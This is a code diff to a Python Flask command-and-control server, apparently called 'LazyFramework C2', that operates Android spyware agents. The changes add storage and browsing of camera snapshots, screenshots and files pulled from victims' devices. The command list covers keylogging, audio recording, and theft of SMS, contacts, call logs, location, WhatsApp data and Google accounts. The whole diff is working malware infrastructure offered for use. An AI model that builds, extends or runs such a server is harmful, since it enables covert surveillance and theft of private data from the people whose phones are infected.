@@ -10,12 +10,15 @@ import threading
 import logging
 import sqlite3
 import datetime
-from flask import Flask, render_template, request, jsonify, session
+import os
+import base64
+import glob
+from flask import Flask, render_template, request, jsonify, session, send_file
 from flask_cors import CORS
 import secrets
 import hashlib
 from config import C2_HOST, C2_PORT, DATABASE, SECRET_KEY, ADMIN_PASSWORD
-from database import init_db, save_agent, save_command, save_result, get_agents, get_commands, get_results
+from database import init_db, save_agent, save_command, save_result, get_agents, get_commands, get_results, get_stats
 import queue
 
 # ==================== LOGGING ====================
@@ -36,7 +39,7 @@ CORS(app)
 
 # ==================== GLOBAL STATE ====================
 agents = {}  # {agent_id: agent_socket_handler}
-command_queue = queue.Queue()  # Queue untuk commands ke agents
+command_queue = queue.Queue()
 lock = threading.Lock()
 
 # ==================== AGENT HANDLER CLASS ====================
@@ -99,7 +102,6 @@ class AgentHandler(threading.Thread):
             }
             self.last_seen = datetime.datetime.now()
             
-            # Save to database
             save_agent(
                 agent_id=self.agent_id,
                 device=self.device_info.get('device'),
@@ -125,6 +127,57 @@ class AgentHandler(threading.Thread):
             timestamp = response_data.get('timestamp')
             command_id = response_data.get('command_id')
             
+            # ============ HANDLE CAMERA SNAPSHOT ============
+            if isinstance(result, dict) and result.get('type') == 'camera_snapshot':
+                image_data = result.get('image_data')
+                if image_data:
+                    os.makedirs('photos', exist_ok=True)
+                    timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+                    filename = f"photos/{agent_id}_snapshot_{timestamp_str}.jpg"
+                    
+                    image_bytes = base64.b64decode(image_data)
+                    with open(filename, 'wb') as f:
+                        f.write(image_bytes)
+                    
+                    logger.info(f"📸 Photo saved: {filename} ({len(image_bytes)} bytes)")
+                    
+                    result['image_data'] = f"<saved to {filename}>"
+                    result['file_path'] = filename
+            
+            # ============ HANDLE SCREENSHOT ============
+            elif isinstance(result, dict) and result.get('type') == 'screenshot':
+                image_data = result.get('image_data')
+                if image_data:
+                    os.makedirs('screenshots', exist_ok=True)
+                    timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+                    filename = f"screenshots/{agent_id}_screenshot_{timestamp_str}.jpg"
+                    
+                    image_bytes = base64.b64decode(image_data)
+                    with open(filename, 'wb') as f:
+                        f.write(image_bytes)
+                    
+                    logger.info(f"🖼️ Screenshot saved: {filename} ({len(image_bytes)} bytes)")
+                    
+                    result['image_data'] = f"<saved to {filename}>"
+                    result['file_path'] = filename
+            
+            # ============ HANDLE FILE DOWNLOAD ============
+            elif isinstance(result, dict) and result.get('type') == 'file_download':
+                file_data = result.get('data')
+                filename = result.get('filename')
+                if file_data and filename:
+                    os.makedirs('downloads', exist_ok=True)
+                    save_path = f"downloads/{agent_id}_{filename}"
+                    
+                    file_bytes = base64.b64decode(file_data)
+                    with open(save_path, 'wb') as f:
+                        f.write(file_bytes)
+                    
+                    logger.info(f"💾 File downloaded: {save_path}")
+                    
+                    result['data'] = f"<saved to {save_path}>"
+                    result['file_path'] = save_path
+            
             # Save to database
             save_result(
                 agent_id=agent_id,
@@ -137,25 +190,23 @@ class AgentHandler(threading.Thread):
             self.last_seen = datetime.datetime.now()
             logger.info(f"📥 Result received from {agent_id}: {command}")
             
-            # Log ke console
-            if isinstance(result, dict):
+            # Log status
+            if isinstance(result, dict) and result.get('status'):
                 logger.info(f"   Status: {result.get('status')}")
-                if result.get('data'):
-                    logger.info(f"   Data count: {result.get('count', 'N/A')}")
             
         except Exception as e:
             logger.error(f"❌ Response error: {e}")
     
     def run(self):
         """Main thread loop - listen untuk data dari agent"""
-        self.socket.settimeout(60)  # 60 detik timeout
+        self.socket.settimeout(60)
         
         try:
             while self.connected:
                 data = self.recv_data()
                 
                 if data is None:
-                    logger.warning(f"⚠️  No data from {self.agent_id}, disconnecting")
+                    logger.warning(f"⚠️ No data from {self.agent_id}, disconnecting")
                     break
                 
                 if not data:
@@ -173,7 +224,7 @@ class AgentHandler(threading.Thread):
                         logger.debug(f"🏓 PONG from {self.agent_id}")
                         self.last_seen = datetime.datetime.now()
                     else:
-                        logger.warning(f"⚠️  Unknown message type: {msg_type}")
+                        logger.warning(f"⚠️ Unknown message type: {msg_type}")
                         
                 except json.JSONDecodeError as e:
                     logger.warning(f"❌ JSON decode error: {data[:100]}")
@@ -227,7 +278,6 @@ def command_sender():
     """Thread untuk send pending commands ke agents"""
     while True:
         try:
-            # Check database untuk pending commands
             pending = get_commands(status='pending', limit=10)
             
             for cmd in pending:
@@ -237,21 +287,18 @@ def command_sender():
                     if agent_id in agents:
                         agent_handler = agents[agent_id]
                         
-                        # Build command JSON
                         command_data = {
                             'id': cmd['id'],
                             'command': cmd['command'],
                             'timestamp': datetime.datetime.now().isoformat()
                         }
                         
-                        # Send command
                         if agent_handler.send_command(command_data):
-                            # Update status di DB
                             save_command(cmd['id'], status='sent')
                         else:
-                            logger.warning(f"⚠️  Agent {agent_id} not responding")
+                            logger.warning(f"⚠️ Agent {agent_id} not responding")
             
-            threading.Event().wait(1)  # Check every 1 second
+            threading.Event().wait(1)
             
         except Exception as e:
             logger.error(f"❌ Command sender error: {e}")
@@ -266,7 +313,8 @@ def index():
         return render_template('login.html')
     
     agents_list = get_agents()
-    return render_template('dashboard.html', agents=agents_list)
+    stats = get_stats()
+    return render_template('dashboard.html', agents=agents_list, stats=stats)
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -274,7 +322,6 @@ def login():
     data = request.get_json()
     password = data.get('password', '')
     
-    # Simple password auth
     if hashlib.sha256(password.encode()).hexdigest() == hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest():
         session['username'] = 'admin'
         session.permanent = True
@@ -297,7 +344,7 @@ def api_agents():
             agents_list.append({
                 'agent_id': agent_id,
                 'device': handler.device_info.get('device'),
-                'android': handler.device_info.get('android'),
+                'android_version': handler.device_info.get('android'),
                 'manufacturer': handler.device_info.get('manufacturer'),
                 'last_seen': handler.last_seen.isoformat(),
                 'online': handler.connected
@@ -316,7 +363,7 @@ def api_agent_detail(agent_id):
             agent_data = {
                 'agent_id': agent_id,
                 'device': handler.device_info.get('device'),
-                'android': handler.device_info.get('android'),
+                'android_version': handler.device_info.get('android'),
                 'manufacturer': handler.device_info.get('manufacturer'),
                 'last_seen': handler.last_seen.isoformat(),
                 'online': handler.connected
@@ -337,10 +384,8 @@ def api_command():
     if not agent_id or not command:
         return jsonify({'error': 'Missing agent_id or command'}), 400
     
-    # Save command to database
     cmd_id = save_command(agent_id=agent_id, command=command, status='pending')
     
-    # Try to send immediately
     with lock:
         if agent_id in agents:
             handler = agents[agent_id]
@@ -381,7 +426,184 @@ def api_ping(agent_id):
     
     return jsonify({'error': 'Agent not found'}), 404
 
-# ==================== HELPER ROUTES ====================
+# ==================== PHOTO ROUTES ====================
+
+@app.route('/api/photo/<agent_id>/<filename>')
+def api_get_photo(agent_id, filename):
+    """Get photo from agent"""
+    photo_dir = 'photos'
+    if not os.path.exists(photo_dir):
+        return jsonify({'error': 'No photos'}), 404
+    
+    for f in os.listdir(photo_dir):
+        if f.startswith(agent_id) and filename in f:
+            filepath = os.path.join(photo_dir, f)
+            return send_file(filepath, mimetype='image/jpeg')
+    
+    return jsonify({'error': 'Photo not found'}), 404
+
+@app.route('/api/photos/<agent_id>')
+def api_list_photos(agent_id):
+    """List all photos from agent"""
+    photo_dir = 'photos'
+    if not os.path.exists(photo_dir):
+        return jsonify({'photos': []})
+    
+    pattern = f"{photo_dir}/{agent_id}_snapshot_*.jpg"
+    files = glob.glob(pattern)
+    
+    photos = []
+    for f in files:
+        filename = os.path.basename(f)
+        size = os.path.getsize(f)
+        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
+        photos.append({
+            'filename': filename,
+            'size': size,
+            'size_formatted': format_file_size(size),
+            'modified': modified,
+            'url': f'/api/photo/{agent_id}/{filename}'
+        })
+    
+    return jsonify({
+        'agent_id': agent_id,
+        'count': len(photos),
+        'photos': photos
+    })
+
+# ==================== SCREENSHOT ROUTES ====================
+
+@app.route('/api/screenshot/<agent_id>/<filename>')
+def api_get_screenshot(agent_id, filename):
+    """Get screenshot from agent"""
+    screenshot_dir = 'screenshots'
+    if not os.path.exists(screenshot_dir):
+        return jsonify({'error': 'No screenshots'}), 404
+    
+    for f in os.listdir(screenshot_dir):
+        if f.startswith(agent_id) and filename in f:
+            filepath = os.path.join(screenshot_dir, f)
+            return send_file(filepath, mimetype='image/jpeg')
+    
+    return jsonify({'error': 'Screenshot not found'}), 404
+
+@app.route('/api/screenshots/<agent_id>')
+def api_list_screenshots(agent_id):
+    """List all screenshots from agent"""
+    screenshot_dir = 'screenshots'
+    if not os.path.exists(screenshot_dir):
+        return jsonify({'screenshots': []})
+    
+    pattern = f"{screenshot_dir}/{agent_id}_screenshot_*.jpg"
+    files = glob.glob(pattern)
+    
+    screenshots = []
+    for f in files:
+        filename = os.path.basename(f)
+        size = os.path.getsize(f)
+        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
+        screenshots.append({
+            'filename': filename,
+            'size': size,
+            'size_formatted': format_file_size(size),
+            'modified': modified,
+            'url': f'/api/screenshot/{agent_id}/{filename}'
+        })
+    
+    return jsonify({
+        'agent_id': agent_id,
+        'count': len(screenshots),
+        'screenshots': screenshots
+    })
+
+# ==================== DOWNLOAD ROUTES ====================
+
+@app.route('/api/download/<agent_id>/<filename>')
+def api_get_download(agent_id, filename):
+    """Get downloaded file from agent"""
+    download_dir = 'downloads'
+    if not os.path.exists(download_dir):
+        return jsonify({'error': 'No downloads'}), 404
+    
+    for f in os.listdir(download_dir):
+        if f.startswith(agent_id) and filename in f:
+            filepath = os.path.join(download_dir, f)
+            return send_file(filepath, as_attachment=True)
+    
+    return jsonify({'error': 'File not found'}), 404
+
+@app.route('/api/downloads/<agent_id>')
+def api_list_downloads(agent_id):
+    """List all downloaded files from agent"""
+    download_dir = 'downloads'
+    if not os.path.exists(download_dir):
+        return jsonify({'downloads': []})
+    
+    pattern = f"{download_dir}/{agent_id}_*"
+    files = glob.glob(pattern)
+    
+    downloads = []
+    for f in files:
+        filename = os.path.basename(f)
+        # Remove agent_id prefix
+        display_name = filename.replace(f"{agent_id}_", "")
+        size = os.path.getsize(f)
+        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
+        downloads.append({
+            'filename': display_name,
+            'original': filename,
+            'size': size,
+            'size_formatted': format_file_size(size),
+            'modified': modified,
+            'url': f'/api/download/{agent_id}/{filename}'
+        })
+    
+    return jsonify({
+        'agent_id': agent_id,
+        'count': len(downloads),
+        'downloads': downloads
+    })
+
+# ==================== SET WALLPAPER ROUTE ====================
+
+@app.route('/api/set_wallpaper', methods=['POST'])
+def api_set_wallpaper():
+    """Set wallpaper on agent"""
+    data = request.get_json()
+    agent_id = data.get('agent_id')
+    image_url = data.get('image_url')
+    image_data = data.get('image_data')
+    
+    if not agent_id:
+        return jsonify({'error': 'agent_id required'}), 400
+    
+    if not image_url and not image_data:
+        return jsonify({'error': 'image_url or image_data required'}), 400
+    
+    command = "SET_WALLPAPER"
+    if image_url:
+        command += " " + image_url
+    elif image_data:
+        command += " " + image_data
+    
+    cmd_id = save_command(agent_id=agent_id, command=command, status='pending')
+    
+    with lock:
+        if agent_id in agents:
+            handler = agents[agent_id]
+            command_data = {
+                'id': cmd_id,
+                'command': command,
+                'timestamp': datetime.datetime.now().isoformat()
+            }
+            
+            if handler.send_command(command_data):
+                save_command(cmd_id, status='sent')
+                return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': True})
+    
+    return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': False, 'message': 'Pending'})
+
+# ==================== STATUS ROUTES ====================
 
 @app.route('/api/status')
 def api_status():
@@ -389,9 +611,13 @@ def api_status():
     with lock:
         agent_count = len(agents)
     
+    stats = get_stats()
+    
     return jsonify({
         'status': 'online',
         'agents_connected': agent_count,
+        'pending_commands': stats.get('pending_commands', 0),
+        'total_results': stats.get('results', 0),
         'timestamp': datetime.datetime.now().isoformat()
     })
 
@@ -399,35 +625,45 @@ def api_status():
 def api_help():
     """Get available commands"""
     commands = [
-        "GET_DEVICE_INFO",
-        "GET_LOCATION",
-        "GET_CLIPBOARD",
-        "GET_INSTALLED_APPS",
-        "GET_CONTACTS",
-        "GET_SMS",
-        "GET_CALL_LOGS",
-        "GET_GALLERY",
-        "GET_FILES_LIST",
-        "RECORD_AUDIO",
-        "STOP_RECORDING",
-        "KEYLOG_START",
-        "KEYLOG_STOP",
-        "KEYLOG_DUMP",
-        "WA_INFO",
-        "WA_CONTACTS",
-        "GET_ACCOUNTS",
-        "GET_GOOGLE_ACCOUNTS",
-        "SHOW_TOAST",
-        "TAKE_PHOTO",
-        "TAKE_PHOTO_FRONT",
-        "TAKE_PHOTO_BACK",
-        "HELP"
+        "GET_DEVICE_INFO - Get device information",
+        "GET_LOCATION - Get GPS location",
+        "GET_CLIPBOARD - Get clipboard content",
+        "GET_INSTALLED_APPS - List installed apps",
+        "GET_CONTACTS - Get contacts (100)",
+        "GET_SMS - Get SMS (50)",
+        "GET_CALL_LOGS - Get call logs (50)",
+        "GET_GALLERY - Get recent photos (50)",
+        "GET_FILES_LIST - List files in /sdcard",
+        "RECORD_AUDIO - Record audio (30s)",
+        "STOP_RECORDING - Stop recording",
+        "KEYLOG_START - Start keylogger",
+        "KEYLOG_STOP - Stop keylogger",
+        "KEYLOG_DUMP - Get keylogs",
+        "WA_INFO - Get WhatsApp info",
+        "WA_CONTACTS - Get WhatsApp contacts",
+        "GET_ACCOUNTS - Get device accounts",
+        "GET_GOOGLE_ACCOUNTS - Get Google accounts",
+        "CAMERA_SNAPSHOT - Take photo with camera",
+        "SCREENSHOT - Capture screen",
+        "SET_WALLPAPER <URL/base64> - Set wallpaper",
+        "SHOW_TOAST - Show toast message",
+        "HELP - Show this help"
     ]
     
     return jsonify({
         'commands': commands,
         'count': len(commands)
     })
+
+# ==================== HELPER FUNCTIONS ====================
+
+def format_file_size(size):
+    """Format file size"""
+    if size <= 0:
+        return "0 B"
+    units = ["B", "KB", "MB", "GB"]
+    digit_groups = int((len(str(size)) - 1) / 3)
+    return f"{size / (1024 ** digit_groups):.1f} {units[digit_groups]}"
 
 # ==================== ERROR HANDLERS ====================
 
@@ -445,6 +681,11 @@ if __name__ == '__main__':
     # Initialize database
     init_db()
     
+    # Create directories
+    os.makedirs('photos', exist_ok=True)
+    os.makedirs('screenshots', exist_ok=True)
+    os.makedirs('downloads', exist_ok=True)
+    
     # Start socket server thread
     socket_thread = threading.Thread(target=socket_server, daemon=True)
     socket_thread.start()
@@ -454,6 +695,9 @@ if __name__ == '__main__':
     sender_thread.start()
     
     logger.info("🚀 LazyFramework C2 Server Starting")
+    logger.info(f"📁 Photos directory: photos/")
+    logger.info(f"📁 Screenshots directory: screenshots/")
+    logger.info(f"📁 Downloads directory: downloads/")
     
     # Run Flask app
     app.run(
@@ -461,5 +705,4 @@ if __name__ == '__main__':
         port=5000,
         debug=False,
         threaded=True,
-        use_reloader=False
-    )
+        use_reloader=False    )
